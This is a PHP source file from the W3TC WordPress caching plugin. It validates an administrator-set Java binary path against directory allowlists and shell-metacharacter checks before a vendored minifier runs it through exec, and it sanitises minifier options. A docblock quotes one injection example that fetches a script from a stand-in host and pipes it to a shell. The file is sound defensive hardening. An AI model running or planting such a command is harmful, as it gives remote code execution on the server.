<?php
/**
 * File: Util_Java.php
 *
 * @package W3TC
 *
 * @since X.X.X
 */

namespace W3TC;

/**
 * Class Util_Java
 *
 * Validates administrator-supplied paths to a Java binary before they are
 * handed to a vendored minifier wrapper that ultimately calls into the
 * OS shell. The W3TC minify subsystem (YUI Compressor, Closure Compiler
 * via the `ccjs` engine) accepts a `path.java` setting and assigns it to
 * a vendored class's static `$javaExecutable` property. The vendored
 * code concatenates that property into a shell command string that is
 * then passed to `exec()` / `shell_exec()`. Without the validation
 * performed by this class, an administrator (or a chained attacker
 * exploiting a separate privilege-escalation primitive) could set
 * `path.java` to `/bin/sh -c 'curl evil/x|sh'` and obtain RCE on the
 * next minifier invocation.
 *
 * The hardening here implements Layer 1 of the
 * `.claude/skills/sec-command-injection/SKILL.md` playbook: the
 * candidate path must canonicalize via `realpath()`, must be
 * executable, and must live underneath one of a small set of trusted
 * directories. Operators with non-standard layouts may override the
 * allowed-directory list by defining
 * `W3TC_JAVA_BIN_ALLOWED_DIRS` (colon-separated) in `wp-config.php`.
 * The constant must be defined server-side; it is never read from
 * web input.
 *
 * @since X.X.X
 */
class Util_Java {
	/**
	 * Validate a candidate Java executable path against the allowlist.
	 *
	 * Returns the canonical absolute path on success, or `false` on
	 * any failure. Callers should treat a `false` return as a signal
	 * to disable the engine; they MUST NOT fall back to the raw
	 * value, because doing so would re-introduce the shell-injection
	 * primitive that this validator exists to close.
	 *
	 * @since X.X.X
	 *
	 * @param string $path Candidate path to a Java binary.
	 *
	 * @return string|false Canonical path on success, false on rejection.
	 */
	public static function validate( $path ) {
		if ( ! is_string( $path ) || '' === $path ) {
			return false;
		}

		// Reject any control character or shell metacharacter before
		// we even touch the filesystem. realpath() would normally
		// strip most of these, but rejecting early keeps the log
		// output sane and prevents accidental TOCTOU surface.
		if ( \preg_match( '/[\x00-\x1F\x7F;&|`$<>"\'\\\\(){}\[\]\*\?]/', $path ) ) {
			return false;
		}

		$real = \realpath( $path );
		if ( false === $real || '' === $real ) {
			return false;
		}

		if ( ! \is_file( $real ) || ! \is_executable( $real ) ) {
			return false;
		}

		// On Windows the binary must end in `.exe` to be runnable
		// without a shell-side resolution step.
		if ( '\\' === DIRECTORY_SEPARATOR ) {
			if ( '.exe' !== \strtolower( \substr( $real, -4 ) ) ) {
				return false;
			}
		}

		$allowed = self::allowed_dirs();
		foreach ( $allowed as $dir ) {
			if ( '' === $dir ) {
				continue;
			}
			$prefix = \rtrim( $dir, '/\\' ) . DIRECTORY_SEPARATOR;
			if ( 0 === \strpos( $real, $prefix ) ) {
				return $real;
			}
		}

		return false;
	}

	/**
	 * Validate a candidate value for the Java executable and emit a
	 * debug-log entry if the candidate is rejected.
	 *
	 * Thin wrapper around `validate()` that surfaces the rejection
	 * to operators via the `minify` debug log so admins can diagnose
	 * "my minifier stopped working" without having to dig into the
	 * shell-injection block separately.
	 *
	 * @since X.X.X
	 *
	 * @param string $path    Candidate path to a Java binary.
	 * @param string $context Short tag used in the debug-log entry
	 *                       (for example, the engine slug `yuijs`).
	 *
	 * @return string|false Canonical path on success, false on rejection.
	 */
	public static function validate_with_log( $path, $context = '' ) {
		$result = self::validate( $path );
		if ( false === $result ) {
			$tag = '' === $context ? 'java' : $context;
			Util_Debug::log(
				'minify',
				\sprintf(
					'Util_Java: rejected non-allowlisted Java executable path for %s (allowed dirs: %s).',
					$tag,
					\implode( ':', self::allowed_dirs() )
				)
			);
		}
		return $result;
	}

	/**
	 * Returns the list of directories from which a Java binary is
	 * accepted. Defaults to a conservative set; operators may
	 * override by defining `W3TC_JAVA_BIN_ALLOWED_DIRS` in
	 * `wp-config.php` (colon-separated, never from web input).
	 *
	 * @since X.X.X
	 *
	 * @return string[]
	 */
	public static function allowed_dirs() {
		if ( \defined( 'W3TC_JAVA_BIN_ALLOWED_DIRS' ) ) {
			$raw  = (string) \constant( 'W3TC_JAVA_BIN_ALLOWED_DIRS' );
			$dirs = \array_filter( \array_map( 'trim', \explode( ':', $raw ) ) );
			if ( ! empty( $dirs ) ) {
				return \array_values( $dirs );
			}
		}

		return array(
			'/usr/bin',
			'/usr/local/bin',
			'/opt',
		);
	}

	/**
	 * Validate the user-supplied options for the Closure Compiler
	 * engine against an allowlist of expected values. Returns a
	 * sanitised array suitable for handing to the vendored
	 * `Minify_ClosureCompiler` minify call.
	 *
	 * The vendored `_getCmd` only consumes `compilation_level` and
	 * `charset` (the latter is hardcoded to `utf-8`). The vendored
	 * code already passes `compilation_level` through
	 * `escapeshellarg()`, so the values here are belt-and-braces:
	 * any value outside the documented set is dropped, falling
	 * back to the default.
	 *
	 * @since X.X.X
	 *
	 * @param array $options Raw options.
	 *
	 * @return array Sanitised options.
	 */
	public static function sanitize_ccjs_options( $options ) {
		$out = array();

		$valid_levels = array(
			'WHITESPACE_ONLY',
			'SIMPLE_OPTIMIZATIONS',
			'ADVANCED_OPTIMIZATIONS',
		);
		if ( isset( $options['compilation_level'] ) && \in_array( $options['compilation_level'], $valid_levels, true ) ) {
			$out['compilation_level'] = $options['compilation_level'];
		}

		// `formatting` is consumed by the W3TC-side wrapper, not the
		// vendored `_getCmd`, but pass it through with the same
		// allowlist so downstream code stays consistent.
		$valid_formatting = array( 'pretty_print', 'print_input_delimiter', '' );
		if ( isset( $options['formatting'] ) && \in_array( $options['formatting'], $valid_formatting, true ) ) {
			$out['formatting'] = $options['formatting'];
		}

		return $out;
	}

	/**
	 * Validate the user-supplied options for the YUI Compressor
	 * engine against an allowlist. The vendored `_getCmd` consumes
	 * a handful of named options; only well-typed values are
	 * forwarded.
	 *
	 * @since X.X.X
	 *
	 * @param array $options Raw options.
	 *
	 * @return array Sanitised options.
	 */
	public static function sanitize_yui_options( $options ) {
		$out = array();

		if ( isset( $options['line-break'] ) && \is_numeric( $options['line-break'] ) ) {
			$out['line-break'] = (int) $options['line-break'];
		}
		foreach ( array( 'nomunge', 'preserve-semi', 'disable-optimizations' ) as $key ) {
			if ( isset( $options[ $key ] ) ) {
				$out[ $key ] = (bool) $options[ $key ];
			}
		}

		return $out;
	}
}
